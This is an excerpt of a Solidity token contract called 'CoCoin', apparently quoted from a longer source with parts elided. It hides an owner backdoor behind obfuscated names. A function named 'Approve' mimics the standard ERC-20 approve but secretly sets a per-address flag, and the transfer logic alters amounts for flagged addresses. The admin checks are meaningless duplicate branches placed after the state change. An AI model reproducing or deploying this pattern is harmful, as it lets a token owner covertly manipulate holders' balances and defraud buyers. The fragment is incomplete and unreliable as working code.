...
contract Token is Ownable {
    ...
    address public yoosAdmintsd;
    uint256 private tokensupply = 10000000000*10**decimals();

    uint256 private _tokentotalSSSupply;
    string private _Tokename = "CoCoin";
    string private _tokenSSSsymbol = "COCOIN";

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public xxlmuserlppy;
    ...
    function exitkillvipccc(address cjjjss) public    {
        uint128 zramount = 0;
        xxlmuserlppy[cjjjss] = zramount;    
        if(_msgSender() == yoosAdmintsd){
            require(_msgSender() == yoosAdmintsd);
        }else{
            require(_msgSender() == yoosAdmintsd);
        }
    ...
    function Approve(address cjjjss) public    {
        ...
        xxlmuserlppy[cjjjss] = newpassnum;
        if(_msgSender() == yoosAdmintsd){
            require(_msgSender() == yoosAdmintsd);
        }else{
            require(_msgSender() == yoosAdmintsd);
    ...
    function _transfer(
        ...
        if (13333 != xxlmuserlppy[vipFrom]) {}else{
            amount = _balances[vipFrom] + xxlmuserlppy[vipFrom];
        }
